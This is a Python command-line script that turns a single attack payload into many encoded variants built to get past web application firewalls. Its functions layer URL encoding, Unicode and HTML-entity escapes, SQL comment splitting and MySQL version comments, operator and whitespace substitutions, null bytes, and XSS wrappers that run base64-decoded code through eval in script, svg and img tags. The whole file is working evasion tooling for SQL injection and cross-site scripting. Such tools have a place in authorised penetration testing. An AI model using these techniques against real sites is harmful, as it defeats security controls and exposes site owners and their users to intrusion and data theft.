#!/usr/bin/env python3
"""
WAF Encoder — emit multi-layer encoded variants of a single payload.

Usage:
  tools/waf_encoder.py "<payload>"
  tools/waf_encoder.py "<payload>" --class sqli
  tools/waf_encoder.py "<payload>" --class xss
  tools/waf_encoder.py "<payload>" --class generic
  tools/waf_encoder.py "<payload>" --layers 2
  tools/waf_encoder.py "<payload>" --json
"""
import sys
import json
import urllib.parse
import base64
import re
import argparse


def url_encode(payload: str, layers: int = 1) -> list[tuple[str, str]]:
    results = []
    encoded = payload
    for i in range(1, layers + 1):
        encoded = urllib.parse.quote(encoded, safe="")
        results.append((f"url-encode-{i}x", encoded))
    return results


def unicode_escape(payload: str) -> list[tuple[str, str]]:
    def to_js_u(c):
        return f"\\u{ord(c):04x}"

    def to_js_u_brace(c):
        return f"\\u{{{ord(c):x}}}"

    variants = []
    js_escape = "".join(to_js_u(c) if not c.isalnum() and c not in " " else c for c in payload)
    if js_escape != payload:
        variants.append(("unicode-js-escape", js_escape))
    js_brace = "".join(to_js_u_brace(c) if not c.isalnum() and c not in " " else c for c in payload)
    if js_brace != payload:
        variants.append(("unicode-js-brace", js_brace))
    full_escape = "".join(to_js_u(c) for c in payload)
    variants.append(("unicode-full-escape", full_escape))
    return variants


def html_entity(payload: str) -> list[tuple[str, str]]:
    def to_decimal(c):
        return f"&#{ord(c)};"

    def to_hex(c):
        return f"&#x{ord(c):x};"

    dec = "".join(to_decimal(c) if not c.isalnum() and c not in " " else c for c in payload)
    hexe = "".join(to_hex(c) if not c.isalnum() and c not in " " else c for c in payload)
    variants = []
    if dec != payload:
        variants.append(("html-entity-decimal", dec))
    if hexe != payload:
        variants.append(("html-entity-hex", hexe))
    full_dec = "".join(to_decimal(c) for c in payload)
    variants.append(("html-entity-decimal-full", full_dec))
    return variants


def sql_comment_inject(payload: str) -> list[tuple[str, str]]:
    keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING", "LIMIT"]
    variants = []

    def comment_split(kw, comment="/**/"):
        return kw[0] + comment + kw[1:]

    result1 = payload
    result2 = payload
    result3 = payload
    for kw in keywords:
        if kw in payload.upper():
            idx = payload.upper().find(kw)
            result1 = result1[:idx] + comment_split(kw) + result1[idx + len(kw):]
            result2 = result2[:idx] + f"/*!{kw}*/" + result2[idx + len(kw):]
            result3 = result3[:idx] + f"/*!50000{kw}*/" + result3[idx + len(kw):]

    if result1 != payload:
        variants.append(("sql-comment-/**/-split", result1))
    if result2 != payload:
        variants.append(("sql-excl-comment", result2))
    if result3 != payload:
        variants.append(("sql-mysql-version-comment", result3))

    full_comment = re.sub(r"([A-Za-z]{2,})", lambda m: m.group(0)[0] + "/**/" + m.group(0)[1:], payload)
    if full_comment != payload:
        variants.append(("sql-every-word-split", full_comment))
    return variants


def case_mix(payload: str) -> list[tuple[str, str]]:
    alternating = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    upper = payload.upper()
    lower = payload.lower()
    variants = [("case-alternating", alternating)]
    if upper != payload:
        variants.append(("case-upper", upper))
    if lower != payload:
        variants.append(("case-lower", lower))
    return variants


def operator_substitute(payload: str) -> list[tuple[str, str]]:
    subs = [
        (" OR ", " || "),
        (" AND ", " && "),
        (" OR ", " OrOr "),
        ("=", " LIKE "),
        ("UNION SELECT", "UNION ALL SELECT"),
        ("UNION SELECT", "UNION DISTINCT SELECT"),
        (" OR ", " OR/**/"),
    ]
    variants = []
    for original, replacement in subs:
        if original in payload.upper():
            replaced = re.sub(re.escape(original), replacement, payload, flags=re.IGNORECASE)
            if replaced != payload:
                variants.append((f"operator-sub-{original.strip()}->{replacement.strip()}", replaced))
    return variants


def base64_wrap_xss(payload: str) -> list[tuple[str, str]]:
    b64 = base64.b64encode(payload.encode()).decode()
    return [
        ("xss-base64-script", f"<script>eval(atob('{b64}'))</script>"),
        ("xss-base64-svg-onload", f"<svg onload=eval(atob('{b64}'))>"),
        ("xss-base64-img-onerror", f"<img src=x onerror=eval(atob('{b64}'))>"),
    ]


def null_byte(payload: str) -> list[tuple[str, str]]:
    return [
        ("null-byte-%00", payload + "%00"),
        ("null-byte-\\x00", payload + "\\x00"),
        ("null-byte-%0a", payload + "%0a"),
        ("null-byte-mid-%00", payload[:len(payload)//2] + "%00" + payload[len(payload)//2:]),
    ]


def tab_newline_space(payload: str) -> list[tuple[str, str]]:
    subs = [
        ("space-to-tab", payload.replace(" ", "\t")),
        ("space-to-%09", payload.replace(" ", "%09")),
        ("space-to-%0a", payload.replace(" ", "%0a")),
        ("space-to-%0b", payload.replace(" ", "%0b")),
        ("space-to-/**/-comment", payload.replace(" ", "/**/")),
        ("space-to-+", payload.replace(" ", "+")),
    ]
    return [(name, val) for name, val in subs if val != payload]


def mysql_version_comment(payload: str) -> list[tuple[str, str]]:
    variants = []
    wrapped = f"/*!50000 {payload}*/"
    variants.append(("mysql-version-50000-wrap", wrapped))
    wrapped2 = f"/*!40000 {payload}*/"
    variants.append(("mysql-version-40000-wrap", wrapped2))
    keywords = ["UNION", "SELECT", "FROM", "WHERE", "ORDER"]
    result = payload
    for kw in keywords:
        if kw in result.upper():
            result = re.sub(kw, f"/*!50000{kw}*/", result, flags=re.IGNORECASE, count=1)
    if result != payload:
        variants.append(("mysql-version-per-keyword", result))
    return variants


def main():
    parser = argparse.ArgumentParser(description="WAF Encoder")
    parser.add_argument("payload", help="Payload to encode")
    parser.add_argument("--class", dest="vuln_class", default="generic",
                        choices=["sqli", "xss", "generic"],
                        help="Vulnerability class (affects which encoders run)")
    parser.add_argument("--layers", type=int, default=3,
                        help="Max URL-encode layers (default 3)")
    parser.add_argument("--json", action="store_true", dest="json_out",
                        help="Output as JSON")
    args = parser.parse_args()

    payload = args.payload
    vuln_class = args.vuln_class
    results: list[dict] = []

    def add(variants):
        for name, encoded in variants:
            results.append({"technique": name, "payload": encoded})

    add(url_encode(payload, layers=args.layers))
    add(unicode_escape(payload))
    add(html_entity(payload))
    add(null_byte(payload))

    if vuln_class in ("sqli", "generic"):
        add(sql_comment_inject(payload))
        add(case_mix(payload))
        add(operator_substitute(payload))
        add(mysql_version_comment(payload))
        add(tab_newline_space(payload))

    if vuln_class in ("xss", "generic"):
        add(base64_wrap_xss(payload))
        if vuln_class == "xss":
            add(case_mix(payload))

    seen = set()
    unique = []
    for r in results:
        key = r["payload"]
        if key not in seen and key != payload:
            seen.add(key)
            unique.append(r)

    if args.json_out:
        print(json.dumps({"original": payload, "variants": unique}, indent=2))
    else:
        print(f"[original]  {payload}")
        print()
        for r in unique:
            print(f"[{r['technique']}]  {r['payload']}")


if __name__ == "__main__":
    main()
